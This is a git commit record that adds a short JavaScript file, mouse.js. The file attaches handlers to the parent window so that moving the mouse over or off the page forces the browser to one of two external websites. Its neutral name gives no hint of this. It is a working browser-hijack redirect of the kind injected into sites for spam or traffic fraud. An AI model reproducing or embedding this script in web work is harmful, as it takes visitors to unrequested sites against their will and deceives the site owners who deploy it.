b5d81ccfefd0e006f7d0c723646a8e7a39fdd410
irawanria85 <irawanria85@gmail.com>
2020-04-20 16:18:27 +0700

    Create mouse.js

---
+++ mouse.js
@@ -0,0 +1,6 @@
+parent.onmouseout = function(event) {
+window.location.href='https://www.aridjaya.com/';
+};
+parent.onmouseover = function(event) {
+window.location.href='https://www.indonesiya.com/';
+};
